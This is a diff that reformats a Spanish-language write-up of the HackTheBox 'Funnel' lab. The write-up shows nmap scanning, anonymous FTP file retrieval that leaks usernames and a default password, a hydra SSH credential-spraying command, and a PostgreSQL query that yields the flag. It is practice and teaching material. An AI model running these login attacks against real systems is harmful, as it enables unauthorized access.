@@ -1,26 +1,16 @@
 # Funnel
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 7 de enero de 2025 21:15
-IP: 10.129.88.226
+Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes EJPT: yes Created time: 7 de enero de 2025 21:15 IP: 10.129.88.226
 
 ## Recopilación de información
 
-<aside>
 💡
-
-</aside>
 
 ### **Escaneo de puertos**
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.88.226 -oG allports
@@ -34,16 +24,15 @@ PORT   STATE SERVICE REASON
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p21,22 -sCV 10.129.88.226 -oN targeted
 ```
 
-- **Identificación de vulnerabilidades**
-
-- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-- 21/tcp open  ftp     vsftpd 3.0.3
+* **Identificación de vulnerabilidades**
+* 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+* 21/tcp open ftp vsftpd 3.0.3
 
 ```bash
 21/tcp open  ftp     vsftpd 3.0.3
@@ -64,11 +53,11 @@ Una vez listado los puertos accesibles, procederemos a realizar la enumeración 
 |_End of status
 ```
 
-- Enumeramos FTP (port 21)
-    
+*   Enumeramos FTP (port 21)
+
     ```bash
     # Conectamos con el FTP sin credenciales
-    
+
      ftp anonymous@10.129.88.226
      ftp> ls
     229 Entering Extended Passive Mode (|||58764|)
@@ -82,15 +71,15 @@ Una vez listado los puertos accesibles, procederemos a realizar la enumeración 
     150 Here comes the directory listing.
     -rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
     -rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
-    
+
     # Descargamos todos los ficheros del directorio
     ftp> mget *
     226 Transfer complete.
     713 bytes received in 00:00 (2.67 KiB/s)
     ```
-    
+
     Revisamos los documentos descargados
-    
+
     ```bash
     cat welcome_28112022
     ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
@@ -100,37 +89,33 @@ Una vez listado los puertos accesibles, procederemos a realizar la enumeración 
        2   │ To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
        3   │ Subject:Welcome to the team!
     ```
-    
-    Enumeramos los siguientes usuarios: 
-    
-    - root
-    - optimus
-    - albert
-    - andreas
-    - christine
-    - maria
-    
+
+    Enumeramos los siguientes usuarios:
+
+    * root
+    * optimus
+    * albert
+    * andreas
+    * christine
+    * maria
+
     Enumerando el otro archivo vemos :
-    
-    ![image.png](/images/HackTheBox/image.png)
-    
+
+    ![image.png](<../../.gitbook/assets/image (1).png>)
+
     Por lo que tenemos un password potencial: **funnel123#!#**
-    
 
 ## Explotación
 
-<aside>
 💡 Intentamos el acceso con las credenciales
-
-</aside>
 
 ### Explotación 1
 
 Creamos dos listas, una con el password y la otra con los usuarios para ver con cual aplica
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](<../../.gitbook/assets/image 2 (1).png>)
 
 ```bash
 ❯ hydra -L users.txt -P password.txt 10.129.88.226 ssh # 10.129.88.226 ssh
@@ -190,7 +175,7 @@ Nombre   |   Dueño   | Codificación | Proveedor de locale |  Collate   |   Cty
            |           |              |                     |            |            |                        |             | christine=CTc/christine
 ```
 
-Vemos la tabla secrets. 
+Vemos la tabla secrets.
 
 ```sql
 # \c para cambiar de base de datos
@@ -219,14 +204,8 @@ Flag: cf277664b1771217d7006acdea006db1
 
 ## Explotación posterior
 
-<aside>
 💡 No hay escalada de privilegios
-
-</aside>
 
 ### Conclusión
 
-<aside>
 💡 Maquina facil y interesante. Me ha servido para aprender conceptos de local port forwardin (ssh)
-
-</aside>
